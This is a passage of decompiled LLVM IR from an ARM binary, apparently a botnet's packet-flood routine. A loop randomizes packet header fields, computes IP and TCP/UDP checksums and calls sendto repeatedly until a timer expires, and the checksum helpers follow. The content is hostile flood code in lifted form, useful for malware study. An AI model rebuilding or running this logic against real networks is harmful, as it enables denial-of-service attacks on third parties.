  store i8 %v0_db68.pre.sink.off0, i8* %v3_db68, align 1
  %v3_db6c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_db74 = add i32 %v3_db6c, 1
  store i32 %v1_db74, i32* @r5, align 4
  store i32 %v2_d920, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_db80 = load i32, i32* @r4, align 4
  %v2_db80 = add i32 %v0_db80, %v2_d920
  store i32 %v2_db80, i32* %r2.global-to-local, align 4
  %v9_db84 = icmp eq i32 %v1_db74, %arg2
  store i1 %v9_db84, i1* %cpsr_z.global-to-local, align 1
  %v3_db88 = add i32 %v2_db80, 4
  %v4_db88 = inttoptr i32 %v3_db88 to i16*
  store i16 256, i16* %v4_db88, align 2
  %v0_db8c = load i32, i32* @lr, align 4
  %v1_db8c = trunc i32 %v0_db8c to i16
  %v2_db8c = load i32, i32* %r2.global-to-local, align 4
  %v3_db8c = add i32 %v2_db8c, 2
  %v4_db8c = inttoptr i32 %v3_db8c to i16*
  store i16 %v1_db8c, i16* %v4_db8c, align 2
  %v0_db90 = load i32, i32* @r5, align 4
  store i32 %v0_db90, i32* %stack_var_-44, align 4
  %v8_db94 = icmp slt i32 %v1_db74, %arg2
  br i1 %v8_db94, label %dec_label_pc_da48, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db68, %dec_label_pc_dd0c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db98
  store i32 %v2_d920, i32* %r1.global-to-local, align 4
  %v1_dbb0 = load i32, i32* @sl, align 4
  %v2_dbb0 = add i32 %v1_dbb0, %v2_d920
  store i32 %v2_dbb0, i32* %r3.global-to-local, align 4
  %v1_dbb4 = add i32 %v2_dbb0, 47
  store i32 %v1_dbb4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dbbc = add i32 %v2_dbb0, 27
  store i32 %v1_dbbc, i32* @sb, align 4
  %v9_dc98 = icmp eq i32 %v3_d998, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  %v9_dbc8 = icmp eq i32 %v3_d99c, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  br label %dec_label_pc_dc84

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dc84
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  store i1 %v9_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbc8, label %dec_label_pc_dcc0, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge, %dec_label_pc_dbc4
  %v1_dbd4 = phi i32 [ %v1_dbd4.pre, %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_dbc4 ]
  store i32 %v3_d9a0, i32* @lr, align 4
  %v9_dbd4 = icmp eq i32 %v3_d9a0, %v1_dbd4
  store i1 %v9_dbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbd4, label %dec_label_pc_dcd4, label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge, %dec_label_pc_dbd0
  %v1_dbe0 = phi i32 [ %v1_dbe0.pre, %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge ], [ %v1_dbd4, %dec_label_pc_dbd0 ]
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v9_dbe0 = icmp eq i32 %v3_d9a4, %v1_dbe0
  store i1 %v9_dbe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbe0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc, %dec_label_pc_dce8
  %v0_dbe8 = load i32, i32* @r7, align 4
  store i32 %v0_dbe8, i32* %r0.global-to-local, align 4
  %v0_dbec = load i32, i32* @sl, align 4
  store i32 %v0_dbec, i32* %r1.global-to-local, align 4
  %v2_dbf0 = call i32 @rand_alphastr(i32 %v0_dbe8, i32 %v0_dbec)
  %v0_dbf4 = load i32, i32* @r8, align 4
  %v1_dbf4 = trunc i32 %v0_dbf4 to i8
  %v2_dbf4 = load i32, i32* @r7, align 4
  %v3_dbf4 = load i32, i32* @sl, align 4
  %v4_dbf4 = add i32 %v3_dbf4, %v2_dbf4
  %v5_dbf4 = inttoptr i32 %v4_dbf4 to i8*
  store i8 %v1_dbf4, i8* %v5_dbf4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r8, align 4
  %v1_dbfc = trunc i32 %v0_dbfc to i16
  %v2_dbfc = load i32, i32* @r4, align 4
  %v3_dbfc = add i32 %v2_dbfc, 10
  %v4_dbfc = inttoptr i32 %v3_dbfc to i16*
  store i16 %v1_dbfc, i16* %v4_dbfc, align 2
  %v0_dc00 = load i32, i32* @r4, align 4
  store i32 %v0_dc00, i32* @r0, align 4
  %v2_dc04 = call i32 @checksum_generic(i32 %v0_dc00, i32 20)
  %v3_dc04 = trunc i32 %v2_dc04 to i16
  store i32 %v2_dc04, i32* %r0.global-to-local, align 4
  %v3_dc08 = load i32, i32* @r4, align 4
  %v4_dc08 = add i32 %v3_dc08, 10
  %v5_dc08 = inttoptr i32 %v4_dc08 to i16*
  store i16 %v3_dc04, i16* %v5_dc08, align 2
  %v0_dc0c = load i32, i32* @r6, align 4
  store i32 %v0_dc0c, i32* @r1, align 4
  %v1_dc10 = add i32 %v0_dc0c, 4
  %v2_dc10 = inttoptr i32 %v1_dc10 to i16*
  %v3_dc10 = load i16, i16* %v2_dc10, align 2
  %v4_dc10 = zext i16 %v3_dc10 to i32
  store i32 %v4_dc10, i32* %r2.global-to-local, align 4
  %v0_dc14 = load i32, i32* @r8, align 4
  %v1_dc14 = trunc i32 %v0_dc14 to i16
  %v3_dc14 = add i32 %v0_dc0c, 6
  %v4_dc14 = inttoptr i32 %v3_dc14 to i16*
  store i16 %v1_dc14, i16* %v4_dc14, align 2
  %v0_dc18 = load i32, i32* @sb, align 4
  store i32 %v0_dc18, i32* %r3.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  store i32 %v0_dc1c, i32* %r0.global-to-local, align 4
  %v4_dc20 = call i32 @checksum_tcpudp(i32 %v0_dc1c, i32 %v0_dc0c, i32 %v4_dc10, i32 %v0_dc18)
  %v5_dc20 = trunc i32 %v4_dc20 to i16
  store i32 %v4_dc20, i32* %r0.global-to-local, align 4
  %v3_dc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v3_dc24, 32
  store i32 %v3_dc2c, i32* %ip.global-to-local, align 4
  %v3_dc30 = load i32, i32* @r6, align 4
  %v4_dc30 = add i32 %v3_dc30, 6
  %v5_dc30 = inttoptr i32 %v4_dc30 to i16*
  store i16 %v5_dc20, i16* %v5_dc30, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r6, align 4
  %v1_dc38 = add i32 %v0_dc38, 2
  %v2_dc38 = inttoptr i32 %v1_dc38 to i16*
  %v3_dc38 = load i16, i16* %v2_dc38, align 2
  %v4_dc38 = zext i16 %v3_dc38 to i32
  store i32 %v4_dc38, i32* @r6, align 4
  %v0_dc3c = load i32, i32* %ip.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_dc3c, -8
  %v5_dc3c = add i32 %v0_dc3c, %tmp135
  %v1_dc40 = load i32, i32* %r1.global-to-local, align 4
  %v2_dc40 = add i32 %v1_dc40, %v5_dc3c
  store i32 %v2_dc40, i32* %ip.global-to-local, align 4
  %v2_dc44 = add i32 %v2_dc40, 4
  %v3_dc44 = inttoptr i32 %v2_dc44 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dc44, align 4
  %v0_dc48 = load i32, i32* @r6, align 4
  %v1_dc48 = trunc i32 %v0_dc48 to i16
  %v2_dc48 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc48 = add i32 %v2_dc48, 2
  %v4_dc48 = inttoptr i32 %v3_dc48 to i16*
  store i16 %v1_dc48, i16* %v4_dc48, align 2
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v0_dc58 = load i32, i32* @fp, align 4
  store i32 %v0_dc58, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_dc60 = load i32, i32* %ip.global-to-local, align 4
  %v6_dc68 = call i32 @__libc_sendto(i32 %v3_d934, i32 %v0_dc4c, i32 %v0_dc58, i32 16384, i32 %v0_dc60, i32 16)
  %v3_dc6c = load i32, i32* %stack_var_-44, align 4
  %v1_dc70 = add i32 %v3_dc6c, 1
  store i32 %v1_dc70, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_dc78 = icmp eq i32 %v1_dc70, %arg2
  store i1 %v9_dc78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dc70, i32* %stack_var_-44, align 4
  %v7_dc80 = icmp slt i32 %v1_dc70, %arg2
  br i1 %v7_dc80, label %dec_label_pc_dc84, label %dec_label_pc_dd0c

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dbac
  %v1_dc90 = phi i32 [ %v1_dc70, %dec_label_pc_dbe8 ], [ 0, %dec_label_pc_dbac ]
  store i32 %v2_d6e4, i32* %r2.global-to-local, align 4
  store i32 %v3_d998, i32* %r3.global-to-local, align 4
  %v4_dc90 = mul i32 %v1_dc90, 4
  %v5_dc90 = add i32 %v4_dc90, %v2_d6e4
  %v6_dc90 = inttoptr i32 %v5_dc90 to i32*
  %v7_dc90 = load i32, i32* %v6_dc90, align 4
  store i32 %v7_dc90, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r5, align 4
  store i1 %v9_dc98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_dca0 = add i32 %v7_dc90, 20
  store i32 %v1_dca0, i32* @r6, align 4
  %v1_dca4 = add i32 %v7_dc90, 41
  store i32 %v1_dca4, i32* @r7, align 4
  br i1 %v9_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dbc4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc84
  %v0_dcac = call i32 @rand_next()
  %v1_dcac = trunc i32 %v0_dcac to i16
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  %v1_dcb4 = load i32, i32* @r5, align 4
  %v9_dcb4 = icmp eq i32 %v3_d99c, %v1_dcb4
  store i1 %v9_dcb4, i1* %cpsr_z.global-to-local, align 1
  %v3_dcb8 = load i32, i32* @r4, align 4
  %v4_dcb8 = add i32 %v3_dcb8, 4
  %v5_dcb8 = inttoptr i32 %v4_dcb8 to i16*
  store i16 %v1_dcac, i16* %v5_dcb8, align 2
  br i1 %v9_dcb4, label %dec_label_pc_dcc0, label %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge

dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge:    ; preds = %dec_label_pc_dcac
  %v1_dbd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dbc4
  %v0_dcc0 = call i32 @rand_next()
  %v1_dcc0 = trunc i32 %v0_dcc0 to i16
  store i32 %v0_dcc0, i32* %r0.global-to-local, align 4
  store i32 %v3_d9a0, i32* @lr, align 4
  %v1_dcc8 = load i32, i32* @r5, align 4
  %v9_dcc8 = icmp eq i32 %v3_d9a0, %v1_dcc8
  store i1 %v9_dcc8, i1* %cpsr_z.global-to-local, align 1
  %v3_dccc = load i32, i32* @r4, align 4
  %v4_dccc = add i32 %v3_dccc, 20
  %v5_dccc = inttoptr i32 %v4_dccc to i16*
  store i16 %v1_dcc0, i16* %v5_dccc, align 2
  br i1 %v9_dcc8, label %dec_label_pc_dcd4, label %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge

dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge:    ; preds = %dec_label_pc_dcc0
  %v1_dbe0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbdc

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dcc0, %dec_label_pc_dbd0
  %v0_dcd4 = call i32 @rand_next()
  %v1_dcd4 = trunc i32 %v0_dcd4 to i16
  %v3_dcd8 = load i32, i32* @r6, align 4
  %v4_dcd8 = add i32 %v3_dcd8, 2
  %v5_dcd8 = inttoptr i32 %v4_dcd8 to i16*
  store i16 %v1_dcd4, i16* %v5_dcd8, align 2
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v9_dce0 = icmp eq i32 %v3_d9a4, %v1_dce0
  store i1 %v9_dce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dce0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc
  %v0_dce8 = call i32 @rand_next()
  %v1_dce8 = trunc i32 %v0_dce8 to i16
  store i32 %v0_dce8, i32* %r0.global-to-local, align 4
  %v3_dcec = load i32, i32* @r4, align 4
  %v4_dcec = add i32 %v3_dcec, 28
  %v5_dcec = inttoptr i32 %v4_dcec to i16*
  store i16 %v1_dce8, i16* %v5_dcec, align 2
  br label %dec_label_pc_dbe8

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_d944
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v1_dcf8 = call i32 @__GI___libc_close(i32 %v3_d934)
  store i32 %v1_dcf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_d91c, %dec_label_pc_d904, %dec_label_pc_dcf4
  %v1_dd08 = phi i32 [ %v3_d934, %dec_label_pc_d91c ], [ %v2_d910, %dec_label_pc_d904 ], [ %v1_dcf8, %dec_label_pc_dcf4 ], [ %v2_dd10, %dec_label_pc_dd0c ]
  store i32 %v18_d6b4, i32* %sb.global-to-local, align 4
  store i32 %v27_d6b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_dd08

dec_label_pc_dd0c.critedge:                       ; preds = %dec_label_pc_d96c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dd0c.critedge, %dec_label_pc_db98
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dd10 = call i32 @__GI_time(i32* null)
  store i32 %v2_dd10, i32* %r0.global-to-local, align 4
  %v9_dd18 = icmp eq i32 %v2_d910, %v2_dd10
  store i1 %v9_dd18, i1* %cpsr_z.global-to-local, align 1
  %v6_dd1c = icmp slt i32 %v2_d910, %v2_dd10
  br i1 %v6_dd1c, label %dec_label_pc_dcfc, label %dec_label_pc_db98

dec_label_pc_dd24:                                ; preds = %dec_label_pc_d8bc, %bb113
  %v0_d8c4.lcssa = phi i32 [ %v1_d890, %dec_label_pc_d8bc ], [ %v0_d8c4, %bb113 ]
  %v2_dd28 = sub i32 %v0_d8c4.lcssa, %v0_d86c
  store i32 %v2_dd28, i32* @r4, align 4
  %v2_dd2c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d880, i32* %r1.global-to-local, align 4
  store i32 %v2_dd2c, i32* %r0.global-to-local, align 4
  store i32 %v2_dd28, i32* %r2.global-to-local, align 4
  %v3_dd3c = call i32 @util_memcpy(i32 %v2_dd2c, i32 %v2_d880, i32 %v2_dd28)
  %v2_dd40 = ptrtoint i32* %stack_var_-40 to i32
  %v1_dd44 = load i32, i32* @r4, align 4
  %v2_dd44 = add i32 %v1_dd44, %v2_dd40
  store i32 %v2_dd44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v3_dd50 = add i32 %v2_dd44, -36
  %v4_dd50 = inttoptr i32 %v3_dd50 to i8*
  store i8 0, i8* %v4_dd50, align 1
  %v1_dd54 = call i32 @inet_addr(i32 %v2_dd2c)
  store i32 %v1_dd54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd60:                                ; preds = %dec_label_pc_d8d0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd70:                                ; preds = %dec_label_pc_d8d0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd84:                                ; preds = %dec_label_pc_d8d0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d904

; uselistorder directives
  uselistorder i32 %v1_dd54, { 1, 0 }
  uselistorder i32 %v2_dd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_dd28, { 1, 0, 2 }
  uselistorder i32 %v2_dd10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_dce8, { 1, 0 }
  uselistorder i32 %v0_dcc0, { 1, 0 }
  uselistorder i32 %v0_dcac, { 1, 0 }
  uselistorder i32 %v7_dc90, { 1, 0, 2 }
  uselistorder i32 %v1_dc70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_dc20, { 1, 0 }
  uselistorder i32 %v0_dc0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i32 %v1_db50.pre, { 1, 0 }
  uselistorder i32 %v2_db48, { 1, 0 }
  uselistorder i32 %v2_db4817, { 1, 0 }
  uselistorder i32 %v0_db5419, { 1, 0 }
  uselistorder i32 %v1_db40, { 1, 0 }
  uselistorder i32 %v3_da2c, { 1, 0 }
  uselistorder i32 %v3_da18, { 1, 0 }
  uselistorder i32 %v3_d9d8, { 1, 0 }
  uselistorder i32 %v1_d9ac, { 1, 0 }
  uselistorder i32 %v3_d9a0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_d99c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_d998, { 1, 0 }
  uselistorder i1 %v7_d964, { 1, 0 }
  uselistorder i1 %v7_d938, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_d920, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_d910, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d90c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d8d4, { 1, 0 }
  uselistorder i32 %v0_d8d0, { 1, 0 }
  uselistorder i32 %v1_d8c4, { 1, 2, 0 }
  uselistorder i1 %v7_d8b0, { 1, 0 }
  uselistorder i32 %v1_d8ac, { 1, 0, 2 }
  uselistorder i1 %v8_d8a4, { 1, 0 }
  uselistorder i1 %v7_d8a0, { 1, 0 }
  uselistorder i32 %v1_d894, { 1, 0 }
  uselistorder i8 %v2_d888, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d88c, { 1, 0 }
  uselistorder i32 %v0_d8ac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d880, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d87c, { 1, 0, 2 }
  uselistorder i32 %v0_d874, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d86c, { 1, 0 }
  uselistorder i32 %v0_d86c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_d810, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d7b0, { 2, 0, 1, 3 }
  uselistorder i32 %v6_d794, { 0, 2, 1 }
  uselistorder i32 %v6_d77c, { 1, 0, 2 }
  uselistorder i32 %v1_d764, { 1, 0 }
  uselistorder i32 %v7_d720, { 1, 0, 2 }
  uselistorder i32 %v1_d708, { 1, 0 }
  uselistorder i32 %v6_d6fc, { 1, 0 }
  uselistorder i32 %v2_d6e4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 37, 7, 4, 5, 6, 8, 9, 10, 35, 11, 36, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 4, 5, 6, 7, 8, 9, 10, 2, 12, 3, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 45, 44, 46, 48, 47, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 67, 7, 5, 8, 6, 9, 11, 10, 12, 14, 13, 15, 17, 16, 18, 19, 21, 20, 22, 23, 24, 32, 25, 26, 27, 28, 29, 30, 31, 36, 33, 34, 35, 37, 39, 38, 41, 40, 42, 43, 44, 46, 45, 47, 48, 50, 49, 51, 53, 52, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 29, 28, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 32, 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 53, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), { 2, 0, 1, 3, 36, 37, 16, 38, 15, 39, 6, 4, 5, 18, 40, 17, 41, 44, 7, 42, 43, 45, 46, 20, 47, 19, 48, 49, 50, 51, 21, 52, 53, 8, 55, 54, 24, 56, 57, 58, 23, 59, 22, 60, 63, 9, 61, 62, 64, 65, 28, 66, 25, 67, 26, 68, 27, 69, 10, 11, 70, 71, 29, 72, 30, 73, 76, 77, 12, 74, 75, 33, 78, 31, 79, 32, 80, 83, 13, 81, 82, 84, 85, 35, 86, 34, 87, 14, 88 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcfc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_dbe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8bc, { 1, 0 }
  uselistorder label %dec_label_pc_d8b0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_ddbc, label %dec_label_pc_dda4

dec_label_pc_dda4:                                ; preds = %entry
  %v0_ddac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda8, %dec_label_pc_dda4
  %v0_ddb4 = phi i32 [ %v2_ddb4, %dec_label_pc_dda8 ], [ 0, %dec_label_pc_dda4 ]
  %v0_ddac = phi i32 [ %v5_ddac, %dec_label_pc_dda8 ], [ %v0_ddac.pre, %dec_label_pc_dda4 ]
  %v0_dda8 = phi i32 [ %v1_dda8, %dec_label_pc_dda8 ], [ %arg1, %dec_label_pc_dda4 ]
  %v1_dda8 = add i32 %v0_dda8, -2
  %v1_ddac = inttoptr i32 %v0_ddac to i16*
  %v2_ddac = load i16, i16* %v1_ddac, align 2
  %v3_ddac = zext i16 %v2_ddac to i32
  %v5_ddac = add i32 %v0_ddac, -2
  store i32 %v5_ddac, i32* @r0, align 4
  %v2_ddb4 = add i32 %v3_ddac, %v0_ddb4
  %v1_dda8.cmp = icmp ugt i32 %v1_dda8, 1
  br i1 %v1_dda8.cmp, label %dec_label_pc_dda8, label %dec_label_pc_ddbc.loopexit

dec_label_pc_ddbc.loopexit:                       ; preds = %dec_label_pc_dda8
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %entry, %dec_label_pc_ddbc.loopexit
  %v1_ddc4 = phi i32 [ %v2_ddb4, %dec_label_pc_ddbc.loopexit ], [ 0, %entry ]
  %v0_ddbc = phi i32 [ %v1_dda8, %dec_label_pc_ddbc.loopexit ], [ %arg1, %entry ]
  %v7_ddbc = icmp eq i32 %v0_ddbc, 1
  br i1 %v7_ddbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ddbc
  %v1_ddc0 = load i32, i32* @r0, align 4
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v4_ddc0 = zext i8 %v3_ddc0 to i32
  %v3_ddc4 = add i32 %v1_ddc4, %v4_ddc0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ddbc, %bb
  %v0_ddc8 = phi i32 [ %v1_ddc4, %dec_label_pc_ddbc ], [ %v3_ddc4, %bb ]
  %v3_ddcc = urem i32 %v0_ddc8, 65536
  %v4_ddd0 = udiv i32 %v0_ddc8, 65536
  %v5_ddd0 = add nuw nsw i32 %v4_ddd0, %v3_ddcc
  %v4_ddd4 = udiv i32 %v5_ddd0, 65536
  %v5_ddd4 = add nuw nsw i32 %v4_ddd4, %v5_ddd0
  %v1_ddd8 = urem i32 %v5_ddd4, 65536
  %v3_dde0 = xor i32 %v1_ddd8, 65535
  ret i32 %v3_dde0

; uselistorder directives
  uselistorder i32 %v5_ddd0, { 1, 0 }
  uselistorder i32 %v5_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 1, 0, 2 }
  uselistorder i32 %v0_ddac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_ddf8 = add i32 %arg1, 12
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  %v3_ddf8 = load i32, i32* %v2_ddf8, align 4
  %v1_ddfc = add i32 %arg1, 16
  %v2_ddfc = inttoptr i32 %v1_ddfc to i32*
  %v3_ddfc = load i32, i32* %v2_ddfc, align 4
  %v7_de00 = icmp sgt i32 %arg3, 1
  br i1 %v7_de00, label %dec_label_pc_de0c.preheader, label %dec_label_pc_de20

dec_label_pc_de0c.preheader:                      ; preds = %entry
  %v0_de10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de0c.preheader, %dec_label_pc_de0c
  %v0_de18 = phi i32 [ 0, %dec_label_pc_de0c.preheader ], [ %v2_de18, %dec_label_pc_de0c ]
  %v0_de10 = phi i32 [ %v0_de10.pre, %dec_label_pc_de0c.preheader ], [ %v5_de10, %dec_label_pc_de0c ]
  %v0_de0c = phi i32 [ %arg3, %dec_label_pc_de0c.preheader ], [ %v1_de0c, %dec_label_pc_de0c ]
  %v1_de0c = add nsw i32 %v0_de0c, -2
  %v1_de10 = inttoptr i32 %v0_de10 to i16*
  %v2_de10 = load i16, i16* %v1_de10, align 2
  %v3_de10 = zext i16 %v2_de10 to i32
  %v5_de10 = add i32 %v0_de10, -2
  store i32 %v5_de10, i32* @r1, align 4
  %v2_de18 = add i32 %v3_de10, %v0_de18
